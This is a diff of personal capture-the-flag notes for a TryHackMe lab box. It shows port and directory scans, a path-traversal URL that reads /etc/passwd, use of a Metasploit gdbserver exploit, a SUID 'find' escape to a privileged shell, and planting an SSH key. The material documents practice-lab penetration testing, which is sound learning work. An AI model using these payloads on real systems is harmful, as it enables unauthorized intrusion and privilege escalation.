@@ -14,16 +14,12 @@ PORT     STATE SERVICE  VERSION
 6048/tcp open  x11?
 8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
 
-
-
 http://airplane.thm:8000/?page=index.html
 
 ┌──(duke㉿kali)-[~/Documents/THM_AirPlane]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://airplane.thm:8000 -x php,txt,html -k
-===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
 [+] Url:                     http://airplane.thm:8000
 [+] Method:                  GET
 [+] Threads:                 10
@@ -32,16 +28,35 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 [+] User Agent:              gobuster/3.1.0
 [+] Extensions:              php,txt,html
 [+] Timeout:                 10s
-===============================================================
 2024/06/13 03:20:15 Starting gobuster in directory enumeration mode
-===============================================================
 /airplane             (Status: 200) [Size: 655]
 
-## Found Path Traversal 
+### Found Path Traversal 
 http://airplane.thm:8000/?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
-
 
 carlos:x:1000: nothing
 hudson:x:1001: get some files from home folder
+
+### Initial Access
+I found out that there is an exploit available for gdbserver, so I used the Metasploit exploit multi/gdb/gdb_server_exec. and fill all required options.
+
+get shell as Hudson
+
+run linpeas and
+
+### Priv Esc
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
+-rwsr-xr-x 1 carlos carlos 313K Feb 18  2020 /usr/bin/find     
+
+
+hudson@airplane:/$ ./usr/bin/find . -exec /bin/sh -p \; -quit
+./usr/bin/find . -exec /bin/sh -p \; -quit
+$ id
+id
+uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
+
+Have access to hudson home folder create own ssh key get full ssh access as **carlos**
+
 
 </code>
